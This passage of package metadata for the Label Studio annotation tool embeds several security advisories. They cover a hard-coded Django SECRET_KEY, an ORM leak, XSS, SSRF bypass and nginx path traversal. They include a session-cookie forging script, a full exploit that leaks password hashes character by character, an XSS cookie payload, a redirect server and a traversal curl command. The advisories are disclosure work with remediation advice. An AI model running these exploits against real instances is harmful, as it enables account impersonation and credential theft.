Label Studio, set the `Content-Security-Policy: sandbox;` response header when viewed on the site. The `sandbox` directive restricts a page's actions to prevent popups, execution of plugins and scripts and enforces a `same-origin` policy ([documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox)).\n* Restrict the allowed file extensions that could be downloaded.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.10.1"],"id":"GHSA-fq23-g58m-799r","link":"https://osv.dev/vulnerability/GHSA-fq23-g58m-799r","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-43791"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability was found to affect versions before `1.8.2`, where a patch was introduced.\n\n# Overview\n\nIn [Label Studio version 1.8.1](https://github.com/HumanSignal/label-studio/tree/1.8.1), a hard coded Django `SECRET_KEY` was set in the application settings. The Django `SECRET_KEY` is used for signing session tokens by the web application framework, and should never be shared with unauthorised parties.\n\nHowever, the Django framework inserts a `_auth_user_hash` claim in the session token that is a HMAC hash of the account's password hash. That claim would normally prevent forging a valid Django session token without knowing the password hash of the account. However, any authenticated user can exploit an Object Relational Mapper (ORM) Leak vulnerability in Label Studio to leak the password hash of any account on the platform, which is reported as a separate vulnerability. An attacker can exploit the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) and forge session tokens for all users on Label Studio using the hard coded `SECRET_KEY`.\n\n# Description\n\nBelow is the code snippet of the Django settings file at [`label_studio/core/settings/base.py`](https://github.com/HumanSignal/label-studio/blob/1.8.1/label_studio/core/settings/base.py#L108).\n\n```python\n# SECURITY WARNING: keep the secret key used in production secret!\nSECRET_KEY = '$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n'\n```\n\nThis secret is hard coded across all instances of Label Studio.\n\n# Proof of Concept\n\nBelow are the steps that an attacker could do to forge a session token of any account on Label Studio:\n\n1. Exploit the ORM Leak vulnerability (patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to retrieve the full password hash that will be impersonated. For this example, a session token will be forged for an account with the email `ghostccamm@testvm.local` with the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=` that was retrieved.\n\n2. Create a new Django project with an empty application. In `cookieforge/cookieforge/settings.py` set the `SECRET_KEY` to `$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n`. Create a management command with the following code that will be used to create forged session tokens.\n\n```python\nfrom typing import Any\nfrom django.core.management.base import  BaseCommand, CommandParser\nfrom django.core import signing\nfrom django.utils.crypto import salted_hmac\nfrom django.conf import settings\nimport time, uuid\n\nclass Command(BaseCommand):\n    help = \"Forge a users session cookie on Label Studio\"\n\n    def add_arguments(self, parser: CommandParser) -> None:\n        parser.add_argument(\n            '-o', '--organisation',\n            help='Organisation ID to access',\n            default=1,\n            type=int\n        )\n\n        parser.add_argument(\n            'user_id',\n            help='The User ID of the victim you want to impersonate',\n            type=str\n        )\n\n        parser.add_argument(\n            'user_hash',\n            help='The password hash the user you want to impersonate'\n        )\n\n    def handle(self, *args: Any, **options: Any) -> str | None:\n        key = settings.SECRET_KEY\n        # Creates the _auth_user_hash HMAC of the victim's password hash\n        auth_user_hash = salted_hmac(\n            'django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash',\n            options['user_hash'],\n            secret=key,\n            algorithm=\"sha256\"\n        ).hexdigest()\n\n        session_dict = {\n            'uid': str(uuid.uuid4()), \n            'organization_pk': options['organisation'], \n            'next_page': '/projects/', \n            'last_login': time.time(), \n            '_auth_user_id': options['user_id'], \n            '_auth_user_backend': \n            'django.contrib.auth.backends.ModelBackend', \n            '_auth_user_hash': auth_user_hash, \n            'keep_me_logged_in': True, \n            '_session_expiry': 600\n        }\n\n        # Creates a forged session token\n        session_token = signing.dumps(\n            session_dict,\n            key=key,\n            salt=\"django.contrib.sessions.backends.signed_cookies\",\n            compress=True\n        )\n\n        self.stdout.write(\n            self.style.SUCCESS(f\"session token: {session_token}\")\n        )\n```\n\n3. Next run the following command replacing the `{user_id}` with the user ID of the account you want to the impersonate and `{user_hash}` with the victim's password hash. Copy the session token that is printed.\n\n```python\npython3 manage.py forgecookie {user_id} '{user_hash}'\n```\n\n4. Change the `sessionid` cookie on the browser and refresh the page. Observe being authenticated as the victim user.\n\n# Impact\n\nThis vulnerability can be chained with the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to impersonate any account on Label Studio. An attacker could exploit these vulnerabilities to escalate their privileges from a low privilege user to a Django Super Administrator user.\n\n# Remediation Advice\n\nIt is important to note that the hard coded `SECRET_KEY` has already been removed in Label Studio versions `>=1.8.2`. However, there has not been any public disclosure about the use of the hard coded secret key and users have not been informed about the security vulnerability.\n\nWe recommend that Human Signal to release a public disclosure about the hard coded `SECRET_KEY` to encourage users to patch to a version `>=1.8.2` to mitigate the likelihood of an attacker exploiting these vulnerabilities to impersonate all accounts on the platform.\n\n# Discovered\n- August 2023, Robert Schuh, @robbilie\n- August 2023, Alex Brown, elttam","fixed_in":["1.8.2"],"id":"GHSA-f475-x83m-rx5m","link":"https://osv.dev/vulnerability/GHSA-f475-x83m-rx5m","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47117"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2post0` and was tested on version `1.8.2`.\n\n# Overview\n\nIn all current versions of [Label Studio](https://github.com/HumanSignal/label-studio), the application allows users to insecurely set filters for filtering tasks. An attacker can construct a *filter chain* to filter tasks based on sensitive fields for all user accounts on the platform by exploiting Django's Object Relational Mapper (ORM). Since the results of query can be manipulated by the ORM filter, an attacker can leak these sensitive fields character by character. For an example, the following filter chain will task results by the password hash of an account on Label Studio.\n\n```\nfilter:tasks:updated_by__active_organization__active_users__password\n```\n\nFor consistency, this type of vulnerability will be termed as **ORM Leak** in the rest of this disclosure. \n\nIn addition, Label Studio had a hard coded secret key that an attacker can use to forge a session token of any user by exploiting this ORM Leak vulnerability to leak account password hashes.\n\n# Description\n\nThe following code snippet from the `ViewSetSerializer` in [`label_studio/data_manager/serializers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/serializers.py#L115) insecurely creates `Filter` objects from a JSON `POST` request to the `/api/dm/views/{viewId}` API endpoint.\n\n```python\n    @staticmethod\n    def _create_filters(filter_group, filters_data):\n        filter_index = 0\n        for filter_data in filters_data:\n            filter_data[\"index\"] = filter_index\n            filter_group.filters.add(Filter.objects.create(**filter_data))\n            filter_index += 1\n```\n\nThese `Filter` objects are then applied in the `TaskQuerySet` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L473).\n\n```python\nclass TaskQuerySet(models.QuerySet):\n    def prepared(self, prepare_params=None):\n        \"\"\" Apply filters, ordering and selected items to queryset\n\n        :param prepare_params: prepare params with project, filters, orderings, etc\n        :return: ordered and filtered queryset\n        \"\"\"\n        from projects.models import Project\n\n        queryset = self\n\n        if prepare_params is None:\n            return queryset\n\n        project = Project.objects.get(pk=prepare_params.project)\n        request = prepare_params.request\n        queryset = apply_filters(queryset, prepare_params.filters, project, request) <1>\n        queryset = apply_ordering(queryset, prepare_params.ordering, project, request, view_data=prepare_params.data)\n\n        if not prepare_params.selectedItems:\n            return queryset\n\n        # included selected items\n        if prepare_params.selectedItems.all is False and prepare_params.selectedItems.included:\n            queryset = queryset.filter(id__in=prepare_params.selectedItems.included)\n\n        # excluded selected items\n        elif prepare_params.selectedItems.all is True and prepare_params.selectedItems.excluded:\n            queryset = queryset.exclude(id__in=prepare_params.selectedItems.excluded)\n\n        return queryset\n```\n1. User provided filters are insecurely applied here by calling the `apply_filters` that constructs the Django ORM filter.\n\nThe `PreparedTaskManager` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L655) uses the vulnerable `TaskQuerySet` for building the Django queryset for querying `Task` objects, as shown in the following code snippet.\n\n```python\nclass PreparedTaskManager(models.Manager):\n    #...\n\n    def get_queryset(self, fields_for_evaluation=None, prepare_params=None, all_fields=False): <1>\n        \"\"\"\n        :param fields_for_evaluation: list of annotated fields in task\n        :param prepare_params: filters, ordering, selected items\n        :param all_fields: evaluate all fields for task\n        :param request: request for user extraction\n        :return: task queryset with annotated fields\n        \"\"\"\n        queryset = self.only_filtered(prepare_params=prepare_params)\n        return self.annotate_queryset(\n            queryset,\n            fields_for_evaluation=fields_for_evaluation,\n            all_fields=all_fields,\n            request=prepare_params.request\n        )\n\n    def only_filtered(self, prepare_params=None):\n        request = prepare_params.request\n        queryset = TaskQuerySet(self.model).filter(project=prepare_params.project) <1>\n        fields_for_filter_ordering = get_fields_for_filter_ordering(prepare_params)\n        queryset = self.annotate_queryset(queryset, fields_for_evaluation=fields_for_filter_ordering, request=request)\n        return queryset.prepared(prepare_params=prepare_params)\n```\n1. Special Django method for the `models.Manager` class that is used to retrieve the queryset for querying objects of a model.\n2. Uses the vulnerable `TaskQuerySet` that was explained above.\n\nThe following code snippet of the `Task` model in [`label_studio/tasks/models.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/models.py#L49C1-L102C102) shows that the vulnerable `PreparedTaskManager` is set as a class variable, along with the `updated_by` relational mapping to a Django user that will be exploited as the entrypoint of the filter chain.\n\n```python\n# ...\nclass Task(TaskMixin, models.Model):\n    \"\"\" Business tasks from project\n    \"\"\"\n    id = models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID', db_index=True)\n\n    # ...\n\n    updated_by = models.ForeignKey(settings.AUTH_USER_MODEL, related_name='updated_tasks',\n        on_delete=models.SET_NULL, null=True, verbose_name=_('updated by'),\n        help_text='Last annotator or reviewer who updated this task') <1>\n\n    # ...\n\n    objects = TaskManager()  # task manager by default\n    prepared = PreparedTaskManager()  # task manager with filters, ordering, etc for data_manager app <2>\n\n    # ...\n```\n1. The entry point of the filter chain to filter by the `updated_by__active_organization__active_users__password`.\n2. The vulnerable `PreparedTaskManager` being set that will be exploited.\n\nFinally, the `TaskListAPI` view set in [`label_studio/tasks/api.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/api.py#L205) with the `/api/tasks` API endpoint uses the vulnerable `PreparedTaskManager` to filter `Task` objects.\n\n```python\n    def get_queryset(self):\n        task_id = self.request.parser_context['kwargs'].get('pk')\n        task = generics.get_object_or_404(Task, pk=task_id)\n        review = bool_from_request(self.request.GET, 'review', False)\n        selected = {\"all\": False, \"included\": [self.kwargs.get(\"pk\")]}\n        if review:\n            kwargs = {\n                'fields_for_evaluation': ['annotators', 'reviewed']\n            }\n        else:\n            kwargs = {'all_fields': True}\n        project = self.request.query_params.get('project') or self.request.data.get('project')\n        if not project:\n            project = task.project.id\n        return self.prefetch(\n            Task.prepared.get_queryset(\n                prepare_params=PrepareParams(project=project, selectedItems=selected, request=self.request),\n                **kwargs\n            )) <1>\n```\n1. Uses the vulnerable `PreparedTaskManager` to filter objects.\n\n# Proof of Concept\n\nBelow are the steps to exploit about how to exploit this vulnerability to leak the password hash of an account on Label Studio.\n\n1. Create two accounts on Label Studio and choose one account to be the victim and the other the hacker account that you will use.\n2. Create a new project or use an existing project, then add a task to the project. Update the task with the hacker account to cause the entry point of the filter chain.\n3. Navigate to the task view for the project and add any filter with the `Network` inspect tab open on the browser. Look for a `PATCH` request to `/api/dm/views/{view_id}?interaction=filter&project={project_id}` and save the `view_id` and `project_id` for the next step.\n4. Download the attached proof of concept exploit script named `labelstudio_ormleak.py`. This script will leak the password hash of the victim account character by character. Run the following command to run the exploit script, replacing the `{view_id}`, `{project_id}`, `{cookie_str}` and `{url}` with the corresponding values. For further explanation run `python3 labelstudio_ormleak.py --help`.\n\n```bash\npython3 labelstudio_ormleak.py -v {view_id} -p {project_id} -c '{cookie_str}' -u '{url}'\n```\n\nThe following example GIF demonstrates exploiting this ORM Leak vulnerability to retrieve the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=`.\n\n![labelstudio_ormleak_poc](https://user-images.githubusercontent.com/139727151/266986646-a3d1367c-fb4d-4482-9b6a-18a5d7316385.gif)\n\n# Impact\n\nThis vulnerability can be exploited to completely compromise the confidentiality of highly sensitive account information, such as account password hashes. For all versions `<=1.8.1`, this finding can also be chained with hard coded `SECRET_KEY` to forge session tokens of any user on Label Studio and could be abuse to deteriorate the integrity and availability.\n\n# Remediation Advice\n\n* Do not use unsanitised values for constructing a filter for querying objects using Django's ORM. Django's ORM allows querying by relation field and performs auto lookups, that enable filtering by sensitive fields.\n* Validate filter values to an allow list before performing any queries.\n\n# Discovered\n- August 2023, Alex Brown, elttam\n\n---\n# `labelstudio_ormleak.py` proof of concept\n\n```py\nimport argparse\nimport re\nimport requests\nimport string\nimport sys\n\n# Password hash characters\nCHARS = string.ascii_letters + string.digits + '$/+=_!'\nCHARS_LEN = len(CHARS)\n\nPAYLOAD = {\n    \"data\": {\n        \"columnsDisplayType\": {},\n        \"columnsWidth\": {},\n        \"filters\": {\n            \"conjunction\": \"and\",\n            \"items\": [\n                {\n                    \"filter\": \"filter:tasks:updated_by__active_organization__active_users__password\", # ORM Leak filter chain\n                    \"operator\": \"regex\", # Use regex operator to filter password hash value\n                    \"type\": \"String\",\n                    \"value\": \"REPLACEME\"\n                }\n            ]\n        },\n        \"gridWidth\": 4,\n        \"hiddenColumns\":{\"explore\":[\"tasks:inner_id\"],\"labeling\":[\"tasks:id\",\"tasks:inner_id\"]},\n        \"ordering\": [],\n        \"search_text\": None,\n        \"target\": \"tasks\",\n        \"title\": \"Default\",\n        \"type\": \"list\"\n    },\n    \"id\": 1, # View ID\n    \"project\": \"1\" # Project ID\n}\n\ndef parse_args() -> argparse.Namespace:\n    parser = argparse.ArgumentParser(\n        description='Leak an accounts password hash by exploiting a ORM Leak vulnerability in Label Studio'\n    )\n\n    parser.add_argument(\n        '-v', '--view-id',\n        help='View id of the page',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-p', '--project-id',\n        help='Project id to filter tasks for',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-c', '--cookie-str',\n        help='Cookie string for authentication',\n        required=True\n    )\n\n    parser.add_argument(\n        '-u', '--url',\n        help='Base URL to Label Studio instance',\n        required=True\n    )\n\n    return parser.parse_args()\n\ndef setup() -> dict:\n    args = parse_args()\n    view_id = args.view_id\n    project_id = args.project_id\n    path_1 = \"/api/dm/views/{view_id}?interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    path_2 = \"/api/tasks?page=1&page_size=1&view={view_id}&interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    PAYLOAD[\"id\"] = view_id\n    PAYLOAD[\"project\"] = str(project_id)\n    \n    config_dict = {\n        'COOKIE_STR': args.cookie_str,\n        'URL_PATH_1': args.url + path_1,\n        'URL_PATH_2': args.url + path_2,\n        'PAYLOAD': PAYLOAD\n    }\n    return config_dict\n\ndef test_payload(config_dict: dict, payload) -> bool:\n    sys.stdout.flush()\n    cookie_str = config_dict[\"COOKIE_STR\"]\n    r_set = requests.patch(\n        config_dict[\"URL_PATH_1\"],\n        json=payload,\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_listen = requests.get(\n        config_dict['URL_PATH_2'],\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_json = r_listen.json()\n    return len(r_json[\"tasks\"]) >= 1\n\ndef test_char(config_dict, known_hash, c):\n    json_payload_suffix = PAYLOAD\n    test_escaped = re.escape(known_hash + c)\n    json_payload_suffix[\"data\"][\"filters\"][\"items\"][0][\"value\"] =  f\"^{test_escaped}\"\n\n    suffix_result = test_payload(config_dict, json_payload_suffix)\n    if suffix_result:\n        return (known_hash + c, c)\n    \n    return None\n\ndef main():\n    config_dict = setup()\n    # By default Label Studio password hashes start with these characters\n    known_hash = \"pbkdf2_sha256$260000$\"\n    print()\n    print(f\"dumped: {known_hash}\", end=\"\")\n    sys.stdout.flush()\n\n    while True:\n        found = False\n\n        for c in CHARS:\n            r = test_char(config_dict, known_hash, c)\n            if not r is None:\n                new_hash, c = r\n                known_hash = new_hash\n                print(c, end=\"\")\n                sys.stdout.flush()\n                found = True\n                break\n\n        if not found:\n            break\n\n    print()\n\nif __name__ == \"__main__\":\n    main()\n```","fixed_in":["1.9.2.post0"],"id":"GHSA-6hjj-gq77-j4qw","link":"https://osv.dev/vulnerability/GHSA-6hjj-gq77-j4qw","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-26152"],"details":"### Summary\nOn all Label Studio versions prior to 1.11.0, data imported via file upload feature is not properly sanitized prior to being rendered within a [`Choices`](https://labelstud.io/tags/choices) or [`Labels`](https://labelstud.io/tags/labels) tag, resulting in an XSS vulnerability.\n\n### Details\nNeed permission to use the \"data import\" function. This was reproduced on Label Studio 1.10.1.\n\n### PoC\n\n1. Create a project.\n![Create a project](https://github.com/HumanSignal/label-studio/assets/3943358/9b1536ad-feac-4238-a1bd-ca9b1b798673)\n\n2. Upload a file containing the payload using the \"Upload Files\" function.\n![2  Upload a file containing the payload using the Upload Files function](https://github.com/HumanSignal/label-studio/assets/3943358/26bb7af1-1cd2-408f-9adf-61e31a5b7328)\n![3  complete](https://github.com/HumanSignal/label-studio/assets/3943358/f2f62774-1fa6-4456-9e6f-8fa1ca0a2d2e)\n\nThe following are the contents of the files used in the PoC\n```\n{\n  \"data\": {\n    \"prompt\": \"labelstudio universe image\",\n    \"images\": [\n      {\n        \"value\": \"id123#0\",\n        \"style\": \"margin: 5px\",\n        \"html\": \"<img width='400' src='https://labelstud.io/_astro/images-tab.64279c16_ZaBSvC.avif' onload=alert(document.cookie)>\"\n      }\n    ]\n  }\n}\n```\n\n3. Select the text-to-image generation labeling template of Ranking and scoring\n![3  Select the text-to-image generation labelling template for Ranking and scoring](https://github.com/HumanSignal/label-studio/assets/3943358/f227f49c-a718-4738-bc2a-807da4f97155)\n![5  save](https://github.com/HumanSignal/label-studio/assets/3943358/9b529f8a-8e99-4bb0-bdf6-bb7a95c9b75d)\n\n4. Select a task\n![4  Select a task](https://github.com/HumanSignal/label-studio/assets/3943358/71856b7a-2b1f-44ea-99ab-fc48bc20caa7)\n\n5. Check that the script is running\n![5  Check that the script is running](https://github.com/HumanSignal/label-studio/assets/3943358/e396ae7b-a591-4db7-afe9-5bab30b48cb9)\n\n### Impact\nMalicious scripts can be injected into the code, and when linked with vulnerabilities such as CSRF, it can cause even greater damage. In particular, It can become a source of further attacks, especially when linked to social engineering.\n","fixed_in":["1.11.0"],"id":"GHSA-6xv9-957j-qfhg","link":"https://osv.dev/vulnerability/GHSA-6xv9-957j-qfhg","source":"osv","summary":null,"withdrawn":null}]},"0.6.0":{"info":{"author":"Heartex","author_email":"hello@heartex.ai","bugtrack_url":null,"classifiers":["License :: OSI Approved :: MIT License","Operating System :: OS Independent","Programming Language :: Python :: 3"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"https://github.com/heartexlabs/label-studio","keywords":"","license":"","maintainer":"","maintainer_email":"","name":"label-studio","package_url":"https://pypi.org/project/label-studio/","platform":"","project_url":"https://pypi.org/project/label-studio/","project_urls":{"Homepage":"https://github.com/heartexlabs/label-studio"},"provides_extra":null,"release_url":"https://pypi.org/project/label-studio/0.6.0/","requires_dist":["appdirs (==1.4.3)","attrs (==19.1.0)","blis (==0.4.1)","certifi (==2019.11.28)","chardet (==3.0.4)","Click (==7.0)","cymem (==2.0.3)","Flask (==1.1.1)","idna (==2.8)","itsdangerous (==1.1.0)","Jinja2 (==2.10.3)","lxml (>=4.2.5)","MarkupSafe (==1.1.1)","mixpanel (==4.4.0)","numpy (==1.17.4)","python-dateutil (==2.8.1)","pytz (==2019.3)","requests (==2.22.0)","six (==1.12.0)","srsly (==0.2.0)","tqdm (==4.40.2)","urllib3 (==1.25.7)","wasabi (==0.4.2)","Werkzeug (==0.16.0)","orjson (>=2.0.11)","rarfile (>=3.1)","flask-api (>=2.0)","pandas (>=0.24.0)","jsonschema (>=3.2.0)","xmljson (==0.2.0)","label-studio-converter (>=0.0.15)","rq (==1.0)"],"requires_python":">=3.5","summary":"Label Studio annotation tool","version":"0.6.0","yanked":false,"yanked_reason":null},"last_serial":25820833,"urls":[{"comment_text":"","digests":{"blake2b_256":"1cc904e1ff5707aa8d9881bebb574400a7793c72f2774616e0290c8a75a05420","md5":"0a8407949857f95744534e1f5237967e","sha256":"ec18056aaf43b3b6de7cae2e700a8662a23a502a2042e739131ae2a52f90286b"},"downloads":-1,"filename":"label_studio-0.6.0-py3-none-any.whl","has_sig":false,"md5_digest":"0a8407949857f95744534e1f5237967e","packagetype":"bdist_wheel","python_version":"py3","requires_python":">=3.5","size":6775724,"upload_time":"2020-05-08T05:47:50","upload_time_iso_8601":"2020-05-08T05:47:50.244522Z","url":"https://files.pythonhosted.org/packages/1c/c9/04e1ff5707aa8d9881bebb574400a7793c72f2774616e0290c8a75a05420/label_studio-0.6.0-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"610cf78b16527b84103e53fcaa32e130e842e1fe3b9300ede59ed265266e443a","md5":"bea4c4c39da27f3c861448349400b7ad","sha256":"721f03719071f4111a0cb8a0d49b5282d1f882227da7a152bc1ac5215137ebdc"},"downloads":-1,"filename":"label-studio-0.6.0.tar.gz","has_sig":false,"md5_digest":"bea4c4c39da27f3c861448349400b7ad","packagetype":"sdist","python_version":"source","requires_python":">=3.5","size":6711466,"upload_time":"2020-05-08T05:47:53","upload_time_iso_8601":"2020-05-08T05:47:53.559566Z","url":"https://files.pythonhosted.org/packages/61/0c/f78b16527b84103e53fcaa32e130e842e1fe3b9300ede59ed265266e443a/label-studio-0.6.0.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF. This issue is fixed in version 1.6.0.","fixed_in":["1.6.0"],"id":"GHSA-pc6f-259w-w3j6","link":"https://osv.dev/vulnerability/GHSA-pc6f-259w-w3j6","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF.","fixed_in":["1.5.0.post0"],"id":"PYSEC-2022-300","link":"https://osv.dev/vulnerability/PYSEC-2022-300","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47116"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to [`1.11.0`](https://github.com/HumanSignal/label-studio/releases/tag/1.11.0) and was tested on version `1.8.2`.\n\n# Overview\n\nLabel Studio's SSRF protections that can be enabled by setting the `SSRF_PROTECTION_ENABLED` environment variable can be bypassed to access internal web servers. This is because the current SSRF validation is done by executing a single DNS lookup to verify that the IP address is not in an excluded subnet range. This protection can be bypassed by either using HTTP redirection or performing a [DNS rebinding attack](https://en.wikipedia.org/wiki/DNS_rebinding).\n\n# Description\n\nThe following `tasks_from_url` method in [`label_studio/data_import/uploader.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_import/uploader.py#L127-L155) performs the SSRF validation (`validate_upload_url`) before sending the request.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1]\n\n        validate_upload_url(url, block_local_urls=settings.SSRF_PROTECTION_ENABLED)\n        # Reason for #nosec: url has been validated as SSRF safe by the\n        # validation check above.\n        response = requests.get(\n            url, verify=False, headers={'Accept-Encoding': None}\n        )  # nosec\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(\n            user, project, SimpleUploadedFile(filename, file_content)\n        )\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(\n            project, file_upload_ids\n        )\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n\nThe `validate_upload_url` code in [`label_studio/core/utils/io.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/core/utils/io.py#L174-L209) is shown below.\n\n```python\ndef validate_upload_url(url, block_local_urls=True):\n    \"\"\"Utility function for defending against SSRF attacks. Raises\n        - InvalidUploadUrlError if the url is not HTTP[S], or if block_local_urls is enabled\n          and the URL resolves to a local address.\n        - LabelStudioApiException if the hostname cannot be resolved\n\n    :param url: Url to be checked for validity/safety,\n    :param block_local_urls: Whether urls that resolve to local/private networks should be allowed.\n    \"\"\"\n\n    parsed_url = parse_url(url)\n\n    if parsed_url.scheme not in ('http', 'https'):\n        raise InvalidUploadUrlError\n\n    domain = parsed_url.host\n    try:\n        ip = socket.gethostbyname(domain)\n    except socket.error:\n        from core.utils.exceptions import LabelStudioAPIException\n        raise LabelStudioAPIException(f\"Can't resolve hostname {domain}\")\n\n    if not block_local_urls:\n        return\n\n    if ip == '0.0.0.0':  # nosec\n        raise InvalidUploadUrlError\n    local_subnets = [\n        '127.0.0.0/8',\n        '10.0.0.0/8',\n        '172.16.0.0/12',\n        '192.168.0.0/16',\n    ]\n    for subnet in local_subnets:\n        if ipaddress.ip_address(ip) in ipaddress.ip_network(subnet):\n            raise InvalidUploadUrlError\n```\n\nThe issue here is the SSRF validation is only performed before the request is sent, and does not validate the destination IP address. Therefore, an attacker can either redirect the request or perform a DNS rebinding attack to bypass this protection.\n\n# Proof of Concept\n\nBoth the HTTP redirection and DNS rebinding methods for bypassing Label Studio's SSRF protections are explained below.\n\n### HTTP Redirection\n\nThe python `requests` module automatically follows HTTP redirects (eg. response code `301` and `302`). Therefore, an attacker could use a URL shortener (eg. `https://www.shorturl.at/`) or host the following Python code on an external server to redirect request from a Label Studio server to an internal web server.\n\n```python\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass RedirectHandler(BaseHTTPRequestHandler):\n\n    def do_GET(self):\n        self.send_response(301)\n        # skip first slash\n        self.send_header('Location', self.path[1:])\n        self.end_headers()\n\nHTTPServer((\"\", 8080), RedirectHandler).serve_forever()\n```\n\n### DNS Rebinding Attack\n\nDNS rebinding can bypass SSRF protections by resolving to an external IP address for the first resolution, but when the request is sent resolves to an internal IP address that is blocked. For an example, the domain `7f000001.030d1fd6.rbndr.us` will randomly switch between the IP address `3.13.31.214` that is not blocked to `127.0.0.1` which is not allowed.\n\n# Impact\n\nSSRF vulnerabilities pose a significant risk on cloud environments, since instance credentials are managed by internal web APIs. An attacker can bypass Label Studio's SSRF protections to access internal web servers and partially compromise the confidentiality of those internal servers.\n\n# Remediation Advice\n\n* Before saving any responses, validate the destination IP address is not in the deny list.\n* Consider blocking internal cloud API IP ranges to mitigate the risk of compromising cloud credentials.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.11.0"],"id":"GHSA-p59w-9gqw-wj8r","link":"https://osv.dev/vulnerability/GHSA-p59w-9gqw-wj8r","source":"osv","summary":null,"withdrawn":null},{"aliases":[],"details":"### Summary\nThe vulnerability resides on the Nginx config file:\nhttps://github.com/heartexlabs/label-studio/blob/53944e6bcede75ca5c102d655013f2e5238e85e6/deploy/default.conf#L119\n\nThe pattern on location /static indicates a popular misconfiguration on Nginx servers presented in 2018 originally by Orange Tsai. This vulnerability allows an attacker to use a single path traversal payload in the matched location to traverse one directory above. This vulnerability only happens due to the location /static directive not having a slash `/` at the end, the following code shows an example of a safe configuration:\n```nginx\nlocation /static/ {\n[...]\n```\nThe vulnerability works because Nginx will think that `/static../` is a directory that should also be aliased to the folder, allowing /static/../ to be reached. In Label Studio's case, this means all files on /label_studio/core/ are exposed.\n\nOf course, this means that only Label Studio instances that were deployed using the default nginx files introducted at Mar 31, 2021.\nThis is a very easy vulnerability to fix, and just a lesser-known configuration mistake on nginx files. It's very easy to happen because all is needed is for one slash to be missing. (Off-By-One)\n\n** Proof-of-Concept (Leaking Secret Keys): **\nExploiting this vulnerability usually depends on what's on the parent folder, in Label Studio's case the most interesting file I could find that's on there by default is /label_studio/core/ . We can fetch it by simply making a request to the traversed folder.\n```bash\n# Production Label Studio docker-compose running on localhost:8080\n/t/mydata [127]$ curl localhost:8080/static../settings/label_studio.py\n\"\"\"This file and its contents are licensed under the Apache License 2.0. Please see the included NOTICE for copyright information and LICENSE for a copy of the license.\n\"\"\"\nimport os\nimport pathlib\n\nfrom core.settings.base import 